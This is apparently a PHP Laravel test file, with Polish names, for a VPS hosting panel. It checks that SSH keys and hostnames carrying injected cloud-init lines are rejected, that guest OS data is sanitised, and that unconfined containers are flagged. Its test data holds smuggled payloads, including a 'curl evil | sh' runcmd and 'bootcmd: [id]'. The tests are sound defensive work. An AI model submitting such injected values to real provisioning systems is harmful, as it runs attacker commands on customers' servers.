<?php

namespace Tests\Feature;

use App\Domain\Provisioning\GuestOs;
use App\Models\Hypervisor;
use App\Models\OsTemplate;
use App\Models\Server;
use App\Models\User;
use App\Models\VpsPackage;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Queue;
use Laravel\Sanctum\Sanctum;
use Tests\TestCase;

/** Dane od klienta i z wnętrza maszyn nie mogą wyjść poza swoje miejsce. */
class IsolationTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        Queue::fake();
    }

    public static function badKeys(): array
    {
        return [
            'nowa linia z YAML' => ["ssh-ed25519 AAAAC3Nz\nruncmd: [curl evil | sh]"],
            'powrót karetki' => ["ssh-ed25519 AAAAC3Nz x\r#cloud-config"],
            'bez klucza' => ['ssh-ed25519'],
            'śmieci' => ['to nie jest klucz'],
        ];
    }

    /** @dataProvider badKeys */
    public function test_klucz_ssh_z_wstrzyknieciem_jest_odrzucany_w_api_reinstalacji(string $key): void
    {
        $owner = User::factory()->create(['role' => User::ROLE_CUSTOMER]);
        $server = Server::factory()->create(['user_id' => $owner->id]);

        $this->actingAs($owner)->postJson("/api/v1/servers/{$server->id}/rebuild", [
            'template' => OsTemplate::factory()->create()->id,
            'ssh_keys' => [$key],
        ])->assertStatus(422)->assertJsonValidationErrors('ssh_keys.0');
    }

    public function test_poprawny_klucz_z_komentarzem(): void
    {
        $this->assertTrue((bool) preg_match(
            \App\Rules\SshPublicKey::PATTERN,
            'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGtest jan@laptop.local',
        ));
    }

    public function test_billing_sprawdza_nazwe_hosta_i_klucze(): void
    {
        $user = User::factory()->create(['role' => User::ROLE_ADMIN]);
        Sanctum::actingAs($user, ['billing']);
        VpsPackage::factory()->create(['slug' => 'std']);

        $this->postJson('/api/v1/billing/provision', [
            'email' => 'k@example.com', 'package' => 'std', 'template' => OsTemplate::factory()->create()->id,
            'hostname' => "vps\nruncmd: [id]", 'ssh_keys' => ["ssh-rsa AAAA\nbootcmd: [id]"], 'reference' => 'svc-1',
        ])->assertStatus(422)->assertJsonValidationErrors(['hostname', 'ssh_keys.0']);
    }

    public function test_dane_z_maszyny_sa_przycinane(): void
    {
        $server = Server::factory()->create(['hypervisor_id' => Hypervisor::factory()->create()->id]);
        Http::fake(['*/os' => Http::response([
            'id' => 'Ubuntu<script>', 'pretty_name' => str_repeat('A', 5000), 'version' => str_repeat('9', 500),
        ])]);

        $this->assertTrue(app(GuestOs::class)->detect($server));

        $server->refresh();
        $this->assertSame('ubuntuscript', $server->guest_os_id);
        $this->assertSame(120, mb_strlen($server->guest_os_name));
        $this->assertSame(40, mb_strlen($server->guest_os_version));
    }

    public function test_strona_wezla_pokazuje_problemy_izolacji(): void
    {
        $admin = User::factory()->create(['role' => User::ROLE_ADMIN]);
        $node = Hypervisor::factory()->containers()->create(['last_health' => ['security' => [
            'apparmor' => true, 'host_guard' => true, 'idmap_isolated' => false, 'max_processes' => 4096,
            'instance_issues' => ['virthub-7' => ['raw.lxc=lxc.apparmor.profile=unconfined']],
        ]]]);

        $this->actingAs($admin)->get(route('panel.admin.hypervisors'))->assertSee('izolacja!');
        $this->actingAs($admin)->get(route('panel.admin.hypervisors.show', $node))
            ->assertSee('virthub-7')
            ->assertSee('raw.lxc=lxc.apparmor.profile=unconfined')
            ->assertSee('Osobne UID/GID kontenerów');
    }
}
